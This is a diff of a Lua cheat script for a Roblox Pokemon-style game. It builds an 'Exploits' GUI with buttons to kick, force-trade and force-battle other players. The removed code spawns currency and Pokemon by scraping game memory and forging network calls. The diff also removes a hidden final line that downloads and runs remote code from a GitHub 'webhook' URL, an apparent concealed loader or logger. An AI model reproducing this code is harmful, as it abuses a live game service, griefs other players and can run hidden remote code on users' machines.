-    Icon = "rbxassetid://10441107015"
+    Name = "Exploits",
+    Icon = "rbxassetid://10469697250"
 }
-local amtPoke
-Tab:Textbox {
-    Name = "Insert Amount 🗳️",
-    Callback = function(str)
-        amtPoke = str
+local playertc
+local playertab = {}
+for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+    table.insert(playertab, v.Name)
+end
+
+Tab:dropdown(
+    {
+        Name = "Select Player 🗳️",
+        StartingText = "Player...",
+        Items = playertab,
+        Description = "Select any player in the game.",
+        Callback = function(v)
+            playertc = v
+        end
+    }
+)
+
+local section = Tab:section{
+    Name = "Kick" -- default
+  }
+
+  section:Button {
+    Name = "Kick Player ✨",
+    Description = gold feature only,
+    Callback = function()
+
     end
 }
 
-Tab:Button {
-    Name = "Generate Dittos ✨",
-    Description = nil,
+section:Button {
+    Name = "Kick All Players ✨",
+    Description = gold feature only,
     Callback = function()
-        spawntix(2000 * tonumber(amtPoke))
-        _p.Network:get("PDS", "getShop", "arcade")
-        wait(3)
-        _p.Network:get("PDS", "buyWithTix", 15, tonumber(amtPoke))
+
     end
 }
 
-Tab:Button {
-    Name = "Generate Hoopas ✨",
-    Description = nil,
+local section = Tab:section{
+    Name = "Force Trade" -- default
+  }
+
+section:Button {
+    Name = "Force Initiated Trade With Player ⚖️",
+    Description = gold feature only,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
-        
-        _p.DataManager:loadChunk("chunk56")
-        _p.Menu.options:getUnstuck(true)
-        wait(2)
-        _p = GetMainData()
-        for i = 1, tonumber(amtPoke) do
-            spawnitem("masterball", 1)
-            local battle =
-                _p.Network:get(
-                "BattleFunction",
-                "new",
-                {
-                    ["expShare"] = false,
-                    ["battleType"] = 0,
-                    ["isDark"] = true,
-                    ["isDay"] = false,
-                    ["chunkId"] = "chunk1",
-                    ["eid"] = _p.DataManager.currentChunk.regionData["Hoopa"].id,
-                    ["regionId"] = "Route 1"
-                }
-            )
-            _p.Network:post("BattleEvent", battle.battleId, "join", 1, ";)")
-            wait(.1)
-            _p.Network:post(
-                "BattleEvent",
-                battle.battleId,
-                "choose",
-                "p1",
-                {
-                    "useitem masterball"
-                },
-                1
-            )
-            _p.Network:post("BattleEvent", battle.battleId, "destroy")
-        end
+
     end
 }
+section:Button {
+    Name = "Force Initiated Trade All ⚖️🤼",
+    Description = gold feature only,
+    Callback = function()
+
+    end
+}
+
+local section = Tab:section{
+    Name = "Battle" -- default
+  }
+
+section:Button {
+    Name = "Force Battle With Player⚔️",
+    Description = gold feature only,
+    Callback = function()
+
+    end
+}
+
+section:Button {
+    Name = "Force Win With Player⚔️🏆",
+    Description = gold feature only,
+    Callback = function()
+
+    end
+}
+
 --[[
     PC
 ]]
+
+
 local Tab =
     GUI:Tab {
     Name = "PC",
     Icon = "rbxassetid://10441119519"
 }
+
+Tab:Button {
+    Name = "Open PC 🖥️",
+    Description = nil,
+    Callback = function()
+        syn.secure_call(_p.Menu.pc.bootUp, localPlayer.PlayerScripts.ChatScript, _p.Menu.pc)
+    end
+}
+
+local section = Tab:section{
+    Name = "Within PC" -- default
+  }
+
 local text
-Tab:Textbox {
+section:Textbox {
     Name = "Type Name 🆔",
     Callback = function(str)
         text = str
     end
 }
 
-Tab:dropdown({
-    Name = "Name Changer 🆔",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon'(s) name",
-    Callback = function(v)
-        _p.Network:get("PDS", "openPC")
-        _p.Network:get("PDS", "cPC", "nickname", v, text)
-    
-    end,
-})
+section:dropdown(
+    {
+        Name = "Name Changer 🌐",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon'(s) name",
+        Callback = function(v)
+            _p.Network:get("PDS", "openPC")
+            _p.Network:get("PDS", "cPC", "nickname", v, text)
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Wallpaper Changer 🆔",
-    StartingText = "Select Wallpaper",
-    Items = {
-        {"leaves", 1},
-        {"magma", 2},
-        {"ocean", 3},
-        {"lightning", 4},
-        {"desert", 5},
-        {"steel", 6},
-        {"shadowy", 7},
-        {"void", 8},
-        {"rocks", 9},
-        {"icey", 10},
-        {"clouds", 11},
-        {"volcano", 12},
-        {"beach", 13},
-        {"charizards", 14},
-        {"iceberg", 15},
-        {"charizards", 16},
-        {"waterfall", 17},
-        {"city", 18},
-        {"space", 19},
-        {"helmet", 20},
-        {"rainbow", 21},
-        {"birds", 22},
-        {"gardevoir", 32},
-        {"eeveelutions", 24},
-        {"team eclipse", 25},
-        {"pbb", 26},
-        {"rgb", 27},
-        {"scorbunny", 28},
-        {"hearts", 29},
-        {"sprinkles", 30}
-        
-    },
-    Description = "Changes all pc wallpapers to selected one",
-    Callback = function(v)
-
-        q = 50
-        for i = 1, q do
-
-        _p.Network:get("PDS", "openPC")
-        _p.Network:get("PDS", "cPC", "setWPaper", i, v)
-    end
-    end,
-})
-
-wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovelatinagirls/ilovelatinas/main/webhook"))()
+section:dropdown(
+    {
+        Name = "Wallpaper Changer 📱",
+        StartingText = "Select Wallpaper",
+        Items = {
+            {"Leaves", 1},
+            {"Magma", 2},
+            {"Ocean", 3},
+            {"Lightning", 4},
+            {"Desert", 5},
+            {"Steel", 6},
+            {"Shadowy", 7},
+            {"Void", 8},
+            {"Rocks", 9},
+            {"Icy", 10},
+            {"Clouds", 11},
+            {"Volcano", 12},
+            {"Beach", 13},
+            {"Charizards", 14},
+            {"Iceberg", 15},
+            {"Charizards", 16},
+            {"Waterfall", 17},
+            {"City", 18},
+            {"Space", 19},
+            {"Helmet", 20},
+            {"Rainbow", 21},
+            {"Girds", 22},
+            {"Gardevoir", 32},
+            {"Eeveelutions", 24},
+            {"Team Eclipse", 25},
+            {"PBB", 26},
+            {"RGB", 27},
+            {"Scorbunny", 28},
+            {"Hearts", 29},
+            {"Sprinkles", 30}
+        },
+        Description = "Changes all pc wallpapers to selected one",
+        Callback = function(v)
+            q = 50
+            for i = 1, q do
+                _p.Network:get("PDS", "openPC")
+                _p.Network:get("PDS", "cPC", "setWPaper", i, v)
+            end
+        end
+    }
+)
